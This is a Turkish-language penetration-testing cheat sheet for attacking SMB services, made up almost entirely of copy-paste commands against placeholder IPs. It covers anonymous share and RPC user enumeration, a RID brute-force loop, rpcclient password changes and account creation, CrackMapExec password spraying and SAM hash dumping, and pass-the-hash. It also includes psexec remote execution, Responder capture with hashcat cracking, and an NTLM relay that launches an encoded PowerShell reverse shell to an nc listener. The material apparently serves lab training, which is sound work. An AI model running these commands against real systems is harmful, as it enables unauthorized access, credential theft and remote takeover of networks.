---
{"dg-publish":true,"permalink":"/cheat-sheet/footprinting/"}
---


# SMB

## 1-SMB Paylaşımlarını Listeleme (Anonim Erişim)

```
smbclient -N -L //10.10.10.10
```

## 2-SMB Paylaşımına Erişim (Anonim Erişim)

```
smbclient //10.10.10.10/share
```

### 2.1-SMB Paylaşımına Erişim (Anonim Erişim) - Bağlandıktan Sonra Çalıştırılabilecek Komutlar

```
smb: \> help
```

- **`ls`** - Paylaşımdaki dosya ve dizinleri listelemek için.
- **`cd`** - Belirtilen dizine geçiş yapmak için.
- **`pwd`** - Geçerli dizinin yolunu görmek için.
- **`get`** - Paylaşımdan dosya indirmek için.
- **`put`** - Yerel bir dosyayı paylaşım alanına yüklemek için.
- **`mkdir`** - Yeni bir dizin oluşturmak için.
- **`del`** - Paylaşımdan dosya silmek için.
- **`help`** - Kullanılabilir komutların listesini görüntülemek için.
- **`exit`** - SMB oturumundan çıkış yapmak için.
- **`stat`** - Paylaşımın istatistik bilgilerini görmek için.
- **`allinfo`** - Bir dosya hakkında ayrıntılı bilgi almak için.
- **`q` veya `quit`** - Oturumdan hızlı çıkış yapmak için.

### 2.2-SMB Paylaşımına Erişim (Anonim Erişim) - Bağlantı Kesmeden Local Sistemde Komut Çalıştırma

```
smb: \> !ls

smb: \> !cat password.txt
```



## 3-Samba Sunucusu Bağlantı Durumunu Görüntüleme (smbstatus)

```shell-session
smbstatus
```



## 4-Footprinting the Service - Nmap 

```shell-session
sudo nmap 10.129.14.128 -sV -sC -p139,445
```

## 5-Anonim RPC Bağlantısı (rpcclient)

```shell-session
rpcclient -U "" 10.10.10.10
```

```
rpcclient -U'%' 10.10.10.10
```




### 5.1-Anonim RPC Enumaration

```
rpcclient $> srvinfo

# Sunucu hakkında bilgi alır, işletim sistemi versiyonu ve sunucu türünü gösterir.


rpcclient $> enumdomains

# Ağdaki mevcut domainleri listeler.


rpcclient $> querydominfo

# Domain hakkında detaylı bilgi verir, toplam kullanıcı, grup ve alias sayısı gibi.


rpcclient $> netshareenumall

# Sunucuda bulunan tüm paylaşımları listeler ve her bir paylaşım hakkında genel bilgi verir.


rpcclient $> netsharegetinfo notes

# Belirli bir paylaşım hakkında detaylı bilgi alır (örneğin: paylaşılan yol, izinler, kullanım sayısı).
```


### 5.2-Anonim RPC User Enumeration

```
rpcclient $> enumdomusers

# Domain'deki tüm kullanıcıları listeler ve her kullanıcının RID'sini gösterir.


rpcclient $> queryuser 0x3e9

# RID: 0x3e9 olan kullanıcı hakkında detaylı bilgi alır. (Kullanıcı adı, profil yolu, parola değişim zamanı vb.)

```


### 5.3-Anonim RPC  Group Enumeration

```
rpcclient $> querygroup 0x201 # RID: 0x201 olan grup hakkında detaylı bilgi alır. (Grup adı, açıklama, grup üyeleri sayısı vb.)
```


### 5-4. **Bir Kullanıcının Parolasını Değiştirme**

```
rpcclient -U administrator //10.10.10.10 -c "password change username newpassword"
```

### 5-5. **Yeni Bir Domain Kullanıcısı Oluşturma**

```
rpcclient -U administrator //10.10.10.10 -c "createuser newuser newpassword"
```

### 5-6. **Yeni Bir Paylaşımlı Klasör Oluşturma**

```
rpcclient -U administrator //10.10.10.10 -c "net share NewShare=C:\\NewFolder"
```




## 6-Kullanıcı RID'lerine Göre Bilgi Sorgulama (Brute Force Kullanıcı Bilgileri)

```shell-session
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```


## 7-SMB Paylaşımlarını Tarama (SMBmap)

```shell-session
smbmap -H 10.10.10.10
```

### 7.1-Belirli Bir Paylaşımı recursive Listeleme (SMBmap)

```
smbmap -H 10.10.10.10 -r sharename
```

### 7.2-Tüm Paylaşımları Recursive Listeleme (SMBmap)

```
smbmap -H 10.10.10.10 -R 
```

### 7.3-Guest Kullanıcı ile Rekürsif Listeleme (SMBmap)

```
smbmap -H 10.10.10.10 -u guest -p "" -R
```

### 7.4-Sadece Okunabilir Dosyaları Listeleme (SMBmap)

```
smbmap -H 10.10.10.10 -u username -p password -r ShareName --read-only
```

### 7.4-Dosya İndirme Ve Yükleme (SMBmap)

```
smbmap -H 10.10.10.10 --download "notes\note.txt"
```

```
smbmap -H 10.10.10.10 --upload test.txt "notes\test.txt"
```



## 8-SMB Paylaşımlarını Tarama (Crackmapexec)

```shell-session
crackmapexec smb 10.129.14.128 --shares -u '' -p ''
```

### 8.1-CrackMapExec ile Local Kimlik Doğrulama Kullanarak Password Spraying

```
crackmapexec smb 10.10.10.10 -u /userlist.txt -p 'Company01!' --local-auth
```


## 9-SMB Hedef Bilgilerini Toplama - enum4linux-ng

```shell-session
./enum4linux-ng.py 10.10.10.10 -A
```


## 10-Impacket-psexec ile Administrator Hesabını Kullanarak Remote Komut Çalıştırma

```
impacket-psexec administrator:'Password123!'@10.10.10.10
```

Aynı seçenekler impacket-smbexec ve impacket-atexec için de geçerlidir.


## 11-CrackMapExec ile SMBexec Yöntemi Kullanarak Uzaktan Komut Çalıştırma

```
crackmapexec smb 10.10.10.10 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

Not: Eğer --exec-metodu tanımlanmamışsa, CrackMapExec atexec metodunu çalıştırmayı deneyecektir, eğer başarısız olursa --exec-metodu smbexec'i belirtmeyi deneyebilirsiniz.

## 12-Logged-on Oturum Açmış Kullanıcıları Numaralandırma (crackmapexec)

```
crackmapexec smb 10.10.10.0/24 -u administrator -p 'Password123!' --loggedon-users
```


## 13-SAM Veritabanından Hash'leri Çıkarma (crackmapexec)

```
crackmapexec smb 10.10.10.10 -u administrator -p 'Password123!' --sam
```

## 14-Pass-the-Hash (PtH) (crackmapexec)

```
crackmapexec smb 10.10.10.10 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

```
responder -I <interface name>
```

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```


## 15- NTLM Relay Attacks

İlk olarak, responder yapılandırma dosyamızda (/etc/responder/Responder.conf) SMB'yi KAPALI olarak ayarlamamız gerekir.

```
cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```


```
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10
```

### 15.1-veya reverse shell

```
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10 -c 'powershell -e JABjAGwAkA..SNIP..GMAawAyACA'
```

```
nc -lvnp 9001
```

